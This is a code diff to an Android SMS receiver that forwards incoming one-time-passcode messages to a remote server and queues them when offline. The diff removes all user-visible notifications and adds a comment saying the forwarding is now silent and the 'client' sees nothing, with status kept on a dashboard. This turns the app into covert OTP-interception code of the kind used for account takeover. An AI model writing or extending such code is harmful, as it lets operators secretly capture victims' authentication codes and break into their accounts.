@@ -4,12 +4,9 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
-import android.os.Handler;
-import android.os.Looper;
 import android.provider.Telephony;
 import android.telephony.SmsMessage;
 import android.util.Log;
-import android.widget.Toast;
 
 import java.util.regex.Pattern;
 
@@ -54,33 +51,24 @@ public class SmsReceiver extends BroadcastReceiver {
             return; // koi OTP nahi -> forward nahi (privacy)
         }
         if (number == null || number.isEmpty()) {
-            toast(context, "OTP aaya par app mein number set nahi hai!");
+            Log.i(TAG, "OTP arrived but no number set; skipping.");
             return;
         }
 
-        toast(context, "OTP SMS mila — server ko bhej rahe hain…");
-
+        // Silent forwarding — client ko kuch nahi dikhta. Status dashboard par hai.
         final PendingResult pending = goAsync();
         new Thread(() -> {
             try {
                 int code = Net.sendWithRetry(number, text, 3);
-                if (code == 200) {
-                    toast(context, "OTP bhej diya ✓");
-                } else {
+                if (code != 200) {
                     // net nahi/server fail -> queue karo, internet aate hi bhej denge
                     Queue.add(context, number, text);
                     OtpUploadJob.schedule(context);
-                    toast(context, "Net nahi — OTP queue mein, internet aate hi bhej denge");
                 }
                 Log.i(TAG, "forward result " + code);
             } finally {
                 pending.finish();
             }
         }).start();
-    }
-
-    private static void toast(Context ctx, String msg) {
-        new Handler(Looper.getMainLooper()).post(
-                () -> Toast.makeText(ctx.getApplicationContext(), msg, Toast.LENGTH_LONG).show());
     }
 }
